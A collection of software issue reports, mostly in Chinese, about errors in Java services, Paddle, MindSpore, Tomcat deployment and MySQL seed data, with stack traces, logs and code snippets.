org.junit.runners.ParentRunner.runChildren(ParentRunner.java:329) at org.junit.runners.ParentRunner.access$100(ParentRunner.java:66) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:293) at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306) at org.junit.runners.ParentRunner.run(ParentRunner.java:413) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:33) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:230) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:58)"
接口请求，空指针,"Forest: version Backend: (okhttp或httpclient)/version okhttp3 3.14.9 疑似空指针位置 报错信息/完整请求日志（如果没有请求日志请把开关打开） 请求日志开着的，连请求都还没开始就报空指针了 接口定义（必要时请提供） DoorService.class DoorClient.class SwjForestInterceptor.class SwjConfig.class   <code>: &lt;dependency&gt; &lt;groupId&gt;com.dtflys.forest&lt;/groupId&gt; &lt;artifactId&gt;forest-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.5.16&lt;/version&gt; &lt;/dependency&gt; 2022-01-26 16:27:36.375 ERROR 24016 --- [nio-7080-exec-3] c.i.m.sanlunche.swj.service.DoorService : 支付开闸参数：OpenDoorBO{rfidCode='3999999999999999', errorOutKey='null', errorOutReason='null', needlessSaveInoutRecord=false, monthticketErrorOpen=false} 2022-01-26 16:27:36.377 ERROR 24016 --- [nio-7080-exec-3] c.i.m.sanlunche.swj.service.DoorService : 支付开闸异常： java.lang.NullPointerException: null at com.dtflys.forest.mapping.MappingURLTemplate.render(MappingURLTemplate.java:103) ~[forest-core-1.5.16.jar!/:na] at com.dtflys.forest.reflection.ForestMethod.makeRequest(ForestMethod.java:761) ~[forest-core-1.5.16.jar!/:na] at com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1330) ~[forest-core-1.5.16.jar!/:na] at com.dtflys.forest.proxy.InterfaceProxyHandler.invoke(InterfaceProxyHandler.java:211) ~[forest-core-1.5.16.jar!/:na] at com.sun.proxy.$Proxy89.openDoor(Unknown Source) ~[na:na] at cn.innoway.modules.sanlunche.swj.service.DoorService.openDoor(DoorService.java:46) ~[classes!/:0.0.1-SNAPSHOT] at cn.innoway.modules.sanlunche.swj.service.DoorService.payOpenDoor(DoorService.java:112) ~[classes!/:0.0.1-SNAPSHOT] public void payOpenDoor(OpenDoorBO bo) { logger.error(""支付开闸参数：{}"", bo); try { openDoor(bo); } catch (Exception e) { logger.error(""支付开闸异常："", e); String msg; if (e instanceof BizException) { msg = ((BizException) e).getMsg(); } else { msg = StringUtils.isEmpty(e.getMessage()) ? ""开闸失败"" : e.getMessage(); } throw new BizException(""支付成功，但"" + msg); } } public void openDoor(OpenDoorBO bo) { String roadNum = bo.getRoadNum(); String baseUrl = SwjConfig.roadNumUrlMap.get(roadNum); doorClient.openDoor(roadNum, baseUrl, bo); } @BaseRequest(interceptor = SwjForestInterceptor.class) public interface DoorClient { @Post(url = ""{1}/openDoor"", dataType = ""json"") ForestResponse&lt;Map&gt; openDoor(String roadNum, String baseUrl, @JSONBody OpenDoorBO bo); } @Override public void afterExecute(ForestRequest request, ForestResponse response) { logger.info(""afterExecute""); if (response.isError()) { String roadNum = (String) request.getArgument(0); throw new BizException(SwjConfig.getErrorMsg(roadNum)); } Map result = (Map) response.getResult(); int code = (int) result.get(""code""); if (code != 100) { String msg = (String) result.get(""msg""); throw new BizException(msg); } } @Configuration @ConfigurationProperties(prefix = ""swj"") public class SwjConfig { private String roadNum21; private String roadNum62; private String roadNum71; private String roadNum72; // 通道编号对应的上位机服务地址 public static Map&lt;String, String&gt; roadNumUrlMap; @PostConstruct public void init() { roadNumUrlMap = new HashMap&lt;&gt;(8); roadNumUrlMap.put(""21"", roadNum21); roadNumUrlMap.put(""62"", roadNum62); roadNumUrlMap.put(""71"", roadNum71); roadNumUrlMap.put(""72"", roadNum72); } public static String getErrorMsg(String roadNum) { String roadName = """"; if (StringUtils.isNotEmpty(roadNum)) { roadName = DoorService.getRoadNameByRoadNum(roadNum); } return ""请检查"" + roadName +""上位机服务""; } getter、setter..."
The `elementwise_op_function.h` should be refine.,"The operators of elementwise are very useful, other operators may be assembled by some of them. For example , the equation of is : https://github.com/PaddlePaddle/Paddle/blob/4e7e39b4bd1a2de02fc9c1e0388f2cdedf868975/paddle/operators/elementwise_op_function.h#L370 Solution <del>Making as a functor,</del> Changing the parameters of this function, ==&gt; , , , , .   <code>: layer_norm layer_norm element_sub element_div element_add element_mul ElementwiseComputeEx framework::ExecutionContext&amp; ctx ElementwiseComputeEx ctx x y z axis ctx"
OpenBLAS under third_party built failed on Mac,"I try to build OpenBLAS under from source, and met the following error: It is a kind error which is caused by missing , and I can fix the problem through the following modification: However, the building process is suspended by another error: I am curious that did you guys meet those problems before? I have googled the error, and it seems a problem of codes related to the target. See #942:Add the automatic update of submodules in cmake. of OpenBLAS. The problem is fixed in #982:Remove bazel of OpenBLAS on 17 Oct 2016. In Paddle, OpenBLAS of is used, which is released on 1 Sep 2016. I think we need to update to the nearest version, that is , released on 24 Jul this year.   <code>: third_party [ 5%] Performing build step for 'extern_openblas' cd /Users/liuyiqun01/work/github/Paddle/build_paddle/third_party/openblas/src/extern_openblas &amp;&amp; /usr/bin/make CC=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang NO_SHARED=1 NO_LAPACK=1 libs DYNAMIC_ARCH=1 NUM_THREADS=64 getarch.c:80:10: fatal error: 'stdio.h' file not found #include &lt;stdio.h&gt; ^ 1 error generated. make[3]: *** [getarch] Error 1 Makefile.system:165: Makefile.conf: No such file or directory Makefile.system:912: Makefile.: No such file or directory make[3]: *** No rule to make target `Makefile.'. Stop. make[2]: *** [../third_party/openblas/src/extern_openblas-stamp/extern_openblas-build] Error 2 make[1]: *** [CMakeFiles/extern_openblas.dir/all] Error 2 make: *** [all] Error 2 sysroot - SET(COMMON_ARGS CC=${CMAKE_C_COMPILER} NO_SHARED=1 NO_LAPACK=1 libs) + IF(APPLE) + SET(OPENBLAS_CC ""${CMAKE_C_COMPILER} -isysroot ${CMAKE_OSX_SYSROOT}"") + SET(COMMON_ARGS CC=${OPENBLAS_CC} NO_SHARED=1 NO_LAPACK=1 libs) + ELSE() + SET(COMMON_ARGS CC=${CMAKE_C_COMPILER} NO_SHARED=1 NO_LAPACK=1 libs) + ENDIF() ../kernel/x86_64/dgemm_kernel_4x8_sandy.S:1849:1: error: unexpected token at start of statement #### Writing Back #### ^ make[4]: *** [dtrmm_kernel_LN_SANDYBRIDGE.o] Error 1 make[4]: *** Waiting for unfinished jobs.... ../kernel/x86_64/dgemm_kernel_4x8_sandy.S:1849:1: error: unexpected token at start of statement #### Writing Back #### ^ make[4]: *** [dtrmm_kernel_LT_SANDYBRIDGE.o] Error 1 make[3]: *** [libs] Error 1 make[2]: *** [../third_party/openblas/src/extern_openblas-stamp/extern_openblas-build] Error 2 make[1]: *** [CMakeFiles/extern_openblas.dir/all] Error 2 make: *** [all] Error 2 SANDYBRIDGE v0.2.19 v0.2.20"
[CT][MS][OCCM][leaky_relu][api mapping] The document of leaky_relu in api mapping document has error,"The document of leaky_relu in api mapping document has error The document of leaky_relu in api mapping document has error tf.nn.leaky_relu 的参数与网址描述不同 mindspore网页： 标杆网页： / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: tf.nn.leaky_relu(features, alpha=0.2) -&gt; Tensor tf.nn.leaky_relu( features, alpha=0.2, name=None )"
windows下，jar包正常运行，但用apache-tomcat-9.0.48 始终跑到这就不动了,"SSL 1.1.1k 25 Mar 2021] 28-Jun-2021 22:58:35.184 信息 [main] org.apache.coyote.AbstractProtocol.init 初始化协议处理器 [""http-nio-8080""] 28-Jun-2021 22:58:35.198 信息 [main] org.apache.catalina.startup.Catalina.load 服务器在[420]毫秒内初始化 28-Jun-2021 22:58:35.221 信息 [main] org.apache.catalina.core.StandardService.startInternal 正在启动服务[Catalina] 28-Jun-2021 22:58:35.221 信息 [main] org.apache.catalina.core.StandardEngine.startInternal 正在启动 Servlet 引擎：[Apache Tomcat/9.0.48] 28-Jun-2021 22:58:35.469 警告 [main] org.apache.catalina.util.SessionIdGeneratorBase.createSecureRandom 使用[SHA1PRNG]创建会话ID生成的SecureRandom实例花费了[106]毫秒。 28-Jun-2021 22:58:35.484 信息 [main] org.apache.catalina.startup.HostConfig.deployWAR 正在部署web应用程序存档文件[D:\apache-tomcat\webapps\ruoyi-admin.war] 28-Jun-2021 22:58:39.585 信息 [main] org.apache.jasper.servlet.TldScanner.scanJars 至少有一个JAR被扫描用于TLD但尚未包含TLD。 为此记录器启用调试日志记录，以获取已扫描但未在其中找到TLD的完整JAR列表。 在扫描期间跳过不需要的JAR可以缩短启动时间 和JSP编译时间。 Application Version: 3.5.0 Spring Boot Version: 2.2.13.RELEASE //////////////////////////////////////////////////////////////////// // <em>ooOoo</em> // // o8888888o // // 88"" . ""88 // // (| ^_^ |) // // O\ = /O // // <em><em>/. // // / \||| : |||// \ // // / <em>||||| -:- |||||- \ // // | | \\ - /// | | // // | _| ''---/'' | | // // \ .-_</em> <em>/-. / // // <em>. . ___ // // ."""" '&lt; - `.;;. : | | // // \ \ / / // // ========-.</em>_</em></em>/</em>.-=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 汣 ??崻 BUG // //////////////////////////////////////////////////////////////////// 22:58:40.320 [background-preinit] INFO o.h.v.i.util.Version - [,21] - HV000001: Hibernate Validator 6.0.22.Final 22:58:40.387 [main] INFO c.r.RuoYiServletInitializer - [logStarting,55] - Starting RuoYiServletInitializer on DESKTOP-9JJD4O9 with PID 9688 (D:\apache-tomcat\webapps\ruoyi-admin\WEB-INF\classes started by 10535 in D:\apache-tomcat\bin) 22:58:40.388 [main] DEBUG c.r.RuoYiServletInitializer - [logStarting,56] - Running with Spring Boot v2.2.13.RELEASE, Spring v5.2.12.RELEASE 22:58:40.388 [main] INFO c.r.RuoYiServletInitializer - [logStartupProfileInfo,655] - The following profiles are active: druid 22:58:44.929 [main] INFO c.a.d.p.DruidDataSource - [init,990] - {dataSource-1} inited 22:58:44.933 [main] DEBUG c.r.s.m.S.selectConfigList - [debug,137] - ==&gt; Preparing: select config_id, config_name, config_key, config_value, config_type, create_by, create_time, update_by, update_time, remark from sys_config 22:58:45.120 [main] DEBUG c.r.s.m.S.selectConfigList - [debug,137] - ==&gt; Parameters: 22:58:45.148 [main] DEBUG c.r.s.m.S.selectConfigList - [debug,137] - &lt;== Total: 3 22:58:45.269 [main] INFO i.l.c.EpollProvider - [,68] - Starting without optional epoll library 22:58:45.271 [main] INFO i.l.c.KqueueProvider - [,70] - Starting without optional kqueue library 22:58:45.652 [main] DEBUG c.r.s.m.S.selectDictTypeAll - [debug,137] - ==&gt; Preparing: select dict_id, dict_name, dict_type, status, create_by, create_time, remark from sys_dict_type 22:58:45.652 [main] DEBUG c.r.s.m.S.selectDictTypeAll - [debug,137] - ==&gt; Parameters: 22:58:45.656 [main] DEBUG c.r.s.m.S.selectDictTypeAll - [debug,137] - &lt;== Total: 10 22:58:45.657 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.670 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_user_sex(String) 22:58:45.673 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 3 22:58:45.704 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.705 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_show_hide(String) 22:58:45.707 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.709 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.710 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_normal_disable(String) 22:58:45.711 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.713 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.713 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_job_status(String) 22:58:45.715 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.716 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.717 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_job_group(String) 22:58:45.719 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.721 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.721 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_yes_no(String) 22:58:45.723 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.725 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.725 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_notice_type(String) 22:58:45.727 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.728 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.729 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_notice_status(String) 22:58:45.735 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:45.745 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.748 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_oper_type(String) 22:58:45.752 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 9 22:58:45.754 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Preparing: select dict_code, dict_sort, dict_label, dict_value, dict_type, css_class, list_class, is_default, status, create_by, create_time, remark from sys_dict_data where status = '0' and dict_type = ? order by dict_sort asc 22:58:45.755 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - ==&gt; Parameters: sys_common_status(String) 22:58:45.756 [main] DEBUG c.r.s.m.S.selectDictDataByType - [debug,137] - &lt;== Total: 2 22:58:46.134 [main] INFO o.q.i.StdSchedulerFactory - [instantiate,1220] - Using default implementation for ThreadExecutor 22:58:46.153 [main] INFO o.q.c.SchedulerSignalerImpl - [,61] - Initialized Scheduler Signaller of type: class org.quartz.core.SchedulerSignalerImpl 22:58:46.153 [main] INFO o.q.c.QuartzScheduler - [,229] - Quartz Scheduler v.2.3.2 created. 22:58:46.161 [main] INFO o.q.c.QuartzScheduler - [initialize,294] - Scheduler meta-data: Quartz Scheduler (v2.3.2) 'RuoyiScheduler' with instanceId 'DESKTOP-9JJD4O91624892326137' Scheduler class: 'org.quartz.core.QuartzScheduler' - running locally. NOT STARTED. Currently in standby mode. Number of jobs executed: 0 Using thread pool 'org.quartz.simpl.SimpleThreadPool' - with 20 threads. Using job-store 'org.springframework.scheduling.quartz.LocalDataSourceJobStore' - which supports persistence. and is clustered. 22:58:46.162 [main] INFO o.q.i.StdSchedulerFactory - [instantiate,1374] - Quartz scheduler 'RuoyiScheduler' initialized from an externally provided properties instance. 22:58:46.162 [main] INFO o.q.i.StdSchedulerFactory - [instantiate,1378] - Quartz scheduler version: 2.3.2 22:58:46.166 [main] INFO o.q.c.QuartzScheduler - [setJobFactory,2293] - JobFactory set to: org.springframework.scheduling.quartz.AdaptableJobFactory@9efbb1b 22:58:46.211 [main] DEBUG c.r.q.m.S.selectJobAll - [debug,137] - ==&gt; Preparing: select job_id, job_name, job_group, invoke_target, cron_expression, misfire_policy, concurrent, status, create_by, create_time, remark from sys_job 22:58:46.212 [main] DEBUG c.r.q.m.S.selectJobAll - [debug,137] - ==&gt; Parameters: 22:58:46.215 [main] DEBUG c.r.q.m.S.selectJobAll - [debug,137] - &lt;== Total: 3 22:58:47.962 [main] WARN s.d.s.r.o.OperationImplicitParameterReader - [modelSpecification,170] - Unable to interpret the implicit parameter configuration with dataType: int, dataTypeClass: class java.lang.Void 22:58:48.000 [main] WARN s.d.s.r.o.OperationImplicitParameterReader - [modelSpecification,170] - Unable to interpret the implicit parameter configuration with dataType: int, dataTypeClass: class java.lang.Void 22:58:48.018 [main] WARN s.d.s.r.o.OperationImplicitParameterReader - [modelSpecification,170] - Unable to interpret the implicit parameter configuration with dataType: Integer, dataTypeClass: class java.lang.Void 22:58:48.019 [main] WARN s.d.s.r.o.OperationImplicitParameterReader - [modelSpecification,170] - Unable to interpret the implicit parameter configuration with dataType: String, dataTypeClass: class java.lang.Void 22:58:48.020 [main] WARN s.d.s.r.o.OperationImplicitParameterReader - [modelSpecification,170] - Unable to interpret the implicit parameter configuration with dataType: String, dataTypeClass: class java.lang.Void 22:58:48.021 [main] WARN s.d.s.r.o.OperationImplicitParameterReader - [modelSpecification,170] - Unable to interpret the implicit parameter configuration with dataType: String, dataTypeClass: class java.lang.Void 22:58:48.075 [main] INFO c.r.RuoYiServletInitializer - [logStarted,61] - Started RuoYiServletInitializer in 8.22 seconds (JVM running for 13.492) 22:58:48.086 [main] DEBUG c.r.f.s.f.JwtAuthenticationTokenFilter - [init,242] - Filter 'jwtAuthenticationTokenFilter' configured for use 28-Jun-2021 22:58:48.098 信息 [main] org.apache.catalina.startup.HostConfig.deployWAR web应用程序存档文件[D:\apache-tomcat\webapps\ruoyi-admin.war]的部署已在[12,614]ms内完成 28-Jun-2021 22:58:48.099 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [D:\apache-tomcat\webapps\docs] 28-Jun-2021 22:58:48.114 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[D:\apache-tomcat\webapps\docs]的部署已在[15]毫秒内完成 28-Jun-2021 22:58:48.120 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [D:\apache-tomcat\webapps\examples] 28-Jun-2021 22:58:48.301 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[D:\apache-tomcat\webapps\examples]的部署已在[181]毫秒内完成 28-Jun-2021 22:58:48.301 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [D:\apache-tomcat\webapps\host-manager] 28-Jun-2021 22:58:48.328 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[D:\apache-tomcat\webapps\host-manager]的部署已在[27]毫秒内完成 28-Jun-2021 22:58:48.329 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory 把web 应用程序部署到目录 [D:\apache-tomcat\webapps\manager] 28-Jun-2021 22:58:48.345 信息 [main] org.apache.catalina.startup.HostConfig.deployDirectory Web应用程序目录[D:\apache-tomcat\webapps\manager]的部署已在[17]毫秒内完成 28-Jun-2021 22:58:48.348 信息 [main] org.apache.coyote.AbstractProtocol.start 开始协议处理句柄[""http-nio-8080""] 28-Jun-2021 22:58:48.356 信息 [main] org.apache.catalina.startup.Catalina.start [13156]毫秒后服务器启动 22:58:49.090 [Quartz Scheduler [RuoyiScheduler]] INFO o.q.c.QuartzScheduler - [start,547] - Scheduler RuoyiScheduler_$_DESKTOP-9JJD4O91624892326137 started.   <code>: ---'\____ // // .' \\| |// - . .' /--.--\ .___\_&lt;|&gt;_/___.' &gt;'"""". // // | | : \ _ / / - -. \_ __\ /__ _/ .- -.____ ____.-'======== // //"
图模式下在construct中使用print 打印dtype报错,"/ 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :1.9 commit id 2490ab51524c8bfc69c085ecbf54d875e7e2da36 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph 执行以上脚本 预期输出数据类型，实际报错 PS：print(""shape"", x.shape) 这一句可以执行，加上 print(x.dtype) 后失败   <code>: import mindspore as ms class Net(ms.nn.Cell): def __init__(self): super().__init__() def construct(self, x): print(""shape"", x.shape) print(x.dtype) return x net = Net() inp = ms.ops.zeros((2, 3), ms.dtype.float32) print(net(inp))"
【众智】【计算-GPU开发】Mode,"Mode 计算输入张量指定维度上的众数及其对应的索引。 input_x values indices dim int 属性 keepdim bool 属性 对应底层算子 对应底层算子Mode, required全部为True torch/csrc/autograd/FunctionsManual.cpp   <code>: class Mode(Primitive):"
Unify ParallelOps architecture and simplify connectors in MindData,"Task Description Unify ParallelOps architecture and simplify connectors in MindData /kind task The goal of this work is to unify parallelOps to one general architecture that can be coded in the base class. This will simplify the connector (queue) structure between Ops. To make it easy for reviewers, we have the work split into 4 PRs: Stage 1 (!24048:Unify parallelOps in MindData Stage 1/4): Move queue registration and init to the base class ParallelOps Use the same worker queue for all ParallelOps subclasses and Make ParallelOp a template class since sub-classes have different type of Queues. Change RandomData to MappableDataset Stage 2 (!24078:Unify parallelOps in MindData Stage 2/4): Remove num_consumer() num_producer() functions from all ops <ol start=""3""> Stage 3 (!24438:Unify parallelOps in MindData Stage 3/4): Change cache ops to be similar to ParalelOp unified design <ol start=""4""> Stage 4 (!24440:Unify parallelOps in MindData Stage 4/4): Cleanup Connector class and rename it Special notes for your reviewers:   <code>: worker_in_queues worker_out_queues"
【ST】【MS】【OPS】ConstantPad2d算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错,"ConstantPad2d算子在mindspore 2.0master分支GPU、CPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU/CPU : -- MindSpore version : mindspore 2.0.0 commit_id = ''[sha1]:cd15cccd,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_constantpad2d_func_input_1d test_ms_ops_constantpad2d_func_input_2d test_ms_ops_constantpad2d_func_input_3d test_ms_ops_constantpad2d_func_input_4d test_ms_ops_constantpad2d_func_input_5d test_ms_ops_constantpad2d_func_input_6d test_ms_ops_constantpad2d_func_input_7d test_ms_ops_constantpad2d_func_input_4d_padding_int test_ms_ops_constantpad2d_func_input_4d_padding_int_negative test_ms_ops_constantpad2d_func_input_4d_padding_tuple_negative test_ms_ops_constantpad2d_func_input_4d_value_int test_ms_ops_constantpad2d_func_input_4d_big_input test_ms_ops_constantpad2d_func_input_4d_float32 test_ms_ops_constantpad2d_func_input_4d_int32 test_ms_ops_constantpad2d_func_input_4d_float64 test_ms_ops_constantpad2d_func_input_4d_int16 export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=CPU_X86 / export DEVICE_TYPE=GPU_PCIE pytest -s test_ms_ops_constantpad2d_func.py 用例执行通过 ` ================================run with dynamic shape================================ FINFO 2022-10-21 16:54:51 - test_ms_ops_constantpad2d_func - test_ms_ops_constantpad2d_func.py:teardown:331 - The case teardown is running self.ms_log.step(""Step1: Start operator accuracy compare."") test_ms_ops_constantpad2d_func.py:289: ../../../../common/ms_aw/operator/nn/constantpad2d_ops.py:87: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../../../../common/ms_aw/operator/nn/constantpad2d_ops.py:54: in forward_mindspore_impl out = net(input_ms) ../../../../common/utils/operator_helper.py:319: in call self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:290: in run_dynamic_shape self.compare_static_input_and_dynamic_input(outputs_grad, outputs_grad_dyn) ../../../../common/utils/operator_helper.py:343: in compare_static_input_and_dynamic_input allclose_nparray(out[i].asnumpy(), out_dyn[i].asnumpy(), 0, 0) ../../../../common/utils/operator_helper.py:182: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) ` 梁成辉   <code>: assert fact.forward_cmp()"
mysql官方那个包，生成数据库初始化数据时报错,"NSERT INTO (, , , , , , , , , , , , , , , , , , , , , , ) VALUES (142307070910556, 'dilon@163.com', 3, NULL, '1986-07-26 00:00:00.000000', NULL, NULL, NULL, NULL, FALSE, NULL, '0001-01-01 00:00:00.000000', '普通用户', 'dilon', 'e10adc3949ba59abbe56e057f20f883e', '18020030720', 1, 0, NULL, 142307070918781, NULL, NULL, NULL); {""EventId"": {""Id"": 20102, ""Name"": ""Microsoft.EntityFrameworkCore.Database.Command.CommandError""}, ""SourceContext"": ""Microsoft.EntityFrameworkCore.Database.Command""} MySql.Data.MySqlClient.MySqlException (0x80004005): Incorrect datetime value: '0001-01-01 00:00:00.000000' for column 'LastLoginTime' at row 1   <code>: sys_user Id Account AdminType Avatar Birthday CreatedTime CreatedUserId CreatedUserName Email IsDeleted LastLoginIp LastLoginTime Name NickName Password Phone Sex Status Tel TenantId UpdatedTime UpdatedUserId UpdatedUserName"
设置AUTO PARALLEL模式运行BERT导致机器重启,"设置AUTO PARALLEL模型运行BERT导致机器重启 -- Ascend -- MindSpore version : 1.2.0 -- Python version : 3.7 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : supplement later 在双机16卡环境中以自动并行(dynamic_programming)方式运行，在启动一段时间后，触发机器自动重启。 我没有对模型进行修改，仅增加从环境变量中读取配置，而无需手动修改config文件。以下列出关键文件的一些修改，具体修改内容可以通过来查看，其中是官方repo中tag 1.2.0的commit ID。 model_zoo/official/nlp/bert/run_pretrain.py: 增加从环境变量中读取PARALLEL_MODE，根据对应值分别指定数据并行、自动并行（动态规划）、自动并行（递归） model_zoo/official/nlp/bert/scripts/distribute_cmd.sh: 添加的一个多机启动脚本 model_zoo/official/nlp/bert/src/config.py: 增加从环境变量中读取BERT_NETWORK, OPTIMIZER, BATCHSIZE等值，并修改相应的config。 设置昇腾机器下运行分布式所需的json文件。 准备bert训练所需的数据集 (on SERVER 0) (on SERVER 1) SERVER 0 与 SERVER 1 分别对应在中配置的两个服务器。 运行一段时间之后，疑似在策略搜索阶段，两台机器自动重启。 程序正常运行/报错，无法完成自动搜索/卡住。 若不设置GLOG_logtostderr(default=1), 则log文件如下（由于重启而看起来像是中断了输出） ![Image description] 将复现步骤中第四部的修改为，程序能正常训练，说明数据集、hccl环境配置等没有问题。 将复现步骤中第四部的修改为，策略搜索失败，程序报错，停止运行。   <code>: model_zoo/official/nlp/bert/run_pretrain.py git clone http://gitee.com/zzqq2199/ms_profile_ascend &amp;&amp; cd ms_profile_ascend &amp;&amp; git checkout 93e37fa450 git diff 1e84d77 -- &lt;path to file&gt; 1e84d77 cd model_zoo/offical/nlp/bert/scripts touch /root/hccl_16p.json &amp;&amp; vim /root/hccl_16p.json wiki MODEL=base DEVICE_NUM=16 PARALLEL_MODE=dynamic_programming DATASET=wiki DATA_PATH=&lt;path to dataset wiki&gt; BATCHSIZE=32 GLOG_v=1 ZQ_SHIFT=0 bash distribute_cmd.sh MODEL=base DEVICE_NUM=16 PARALLEL_MODE=dynamic_programming DATASET=wiki DATA_PATH=&lt;path to dataset wiki&gt; BATCHSIZE=32 GLOG_v=1 ZQ_SHIFT=0 bash distribute_cmd.sh /root/hccl_16p.json PARALLEL_MODE=dynamic_programming PARALLEL_MODE=data_parallel PARALLEL_MODE=dynamic_programming PARALLEL_MODE=recursive_programming"
